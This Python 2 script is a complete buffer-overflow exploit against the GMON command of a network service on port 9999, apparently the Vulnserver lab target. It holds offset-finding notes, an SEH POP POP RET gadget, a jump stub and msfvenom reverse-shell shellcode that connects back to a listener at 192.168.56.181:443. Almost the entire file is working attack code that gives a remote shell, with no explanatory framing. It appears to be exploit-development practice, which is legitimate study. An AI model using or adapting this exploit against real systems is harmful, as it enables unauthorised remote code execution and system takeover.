#!/usr/bin/env python2
import os, sys,time
from socket import socket, AF_INET, SOCK_STREAM
HOST='192.168.56.8'
PORT=9999

NOTES="""\
oflow="GMON /.../"
oflow+="A"*5000
oflow+="\r\n"
"""

# oflow+="A"*5000
# oflow += sys.argv[1]  # ./gmon.py $(`locate pattern_create.rb |head -n1` 5000) # 336E4532 
# `locate pattern_offset.rb|head -n 1` 336E4532 5000  #  3518
# 625010B4   5B POP EBX
# 625010B5   5D	POP EBP
# 625010B6   C3	RETN

avoid = [0x00, 0x0a, 0x0d]
oflow="GMON /.../"
oflow+="\x90"*(3518-351-24-4)
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.181 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -i 1 -f c
oflow+=(\
"\xb8\x99\x56\x61\x1c\xd9\xc6\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x52\x83\xc7\x04\x31\x47\x0e\x03\xde\x58\x83\xe9\x1c\x8c\xc1"
"\x12\xdc\x4d\xa6\x9b\x39\x7c\xe6\xf8\x4a\x2f\xd6\x8b\x1e\xdc"
"\x9d\xde\x8a\x57\xd3\xf6\xbd\xd0\x5e\x21\xf0\xe1\xf3\x11\x93"
"\x61\x0e\x46\x73\x5b\xc1\x9b\x72\x9c\x3c\x51\x26\x75\x4a\xc4"
"\xd6\xf2\x06\xd5\x5d\x48\x86\x5d\x82\x19\xa9\x4c\x15\x11\xf0"
"\x4e\x94\xf6\x88\xc6\x8e\x1b\xb4\x91\x25\xef\x42\x20\xef\x21"
"\xaa\x8f\xce\x8d\x59\xd1\x17\x29\x82\xa4\x61\x49\x3f\xbf\xb6"
"\x33\x9b\x4a\x2c\x93\x68\xec\x88\x25\xbc\x6b\x5b\x29\x09\xff"
"\x03\x2e\x8c\x2c\x38\x4a\x05\xd3\xee\xda\x5d\xf0\x2a\x86\x06"
"\x99\x6b\x62\xe8\xa6\x6b\xcd\x55\x03\xe0\xe0\x82\x3e\xab\x6c"
"\x66\x73\x53\x6d\xe0\x04\x20\x5f\xaf\xbe\xae\xd3\x38\x19\x29"
"\x13\x13\xdd\xa5\xea\x9c\x1e\xec\x28\xc8\x4e\x86\x99\x71\x05"
"\x56\x25\xa4\x8a\x06\x89\x17\x6b\xf6\x69\xc8\x03\x1c\x66\x37"
"\x33\x1f\xac\x50\xde\xda\x27\x9f\xb7\xdc\x02\x77\xca\x1c\x6c"
"\x33\x43\xfa\x04\x53\x02\x55\xb1\xca\x0f\x2d\x20\x12\x9a\x48"
"\x62\x98\x29\xad\x2d\x69\x47\xbd\xda\x99\x12\x9f\x4d\xa5\x88"
"\xb7\x12\x34\x57\x47\x5c\x25\xc0\x10\x09\x9b\x19\xf4\xa7\x82"
"\xb3\xea\x35\x52\xfb\xae\xe1\xa7\x02\x2f\x67\x93\x20\x3f\xb1"
"\x1c\x6d\x6b\x6d\x4b\x3b\xc5\xcb\x25\x8d\xbf\x85\x9a\x47\x57"
"\x53\xd1\x57\x21\x5c\x3c\x2e\xcd\xed\xe9\x77\xf2\xc2\x7d\x70"
"\x8b\x3e\x1e\x7f\x46\xfb\x3e\x62\x42\xf6\xd6\x3b\x07\xbb\xba"
"\xbb\xf2\xf8\xc2\x3f\xf6\x80\x30\x5f\x73\x84\x7d\xe7\x68\xf4"
"\xee\x82\x8e\xab\x0f\x87") # 351
oflow+="\x90"*24
oflow+="\xeb\x0b" + "\x90\x90" # jmp short +11
oflow += "\xb4\x10\x50\x62" # POP POP RET essfunc.dll ASLR=no DEP=no SafeSEH=no
oflow += "\x90"*10
oflow +=(\
	"\xd9\xee"					# fldz
	"\xd9\x74\x24\xf4"			# fnstenv [esp-0xc]
	"\x59"						# pop ecx
	"\x80\xc1\x0a"				# add CL, 0x0A
	"\x90"						# nop
	"\xfe\xcd"					# dec CH
	"\xfe\xcd"					# dec CH
	"\xfe\xcd"					# dec CH
	"\xff\xe1"					# JMP ECX
) # 19 bytes
oflow+="C"*(5000-3518-4-10-19)
oflow+="\r\n"



sx = socket(AF_INET,SOCK_STREAM)
sx.connect((HOST,PORT))
sx.send(oflow)
sx.close()
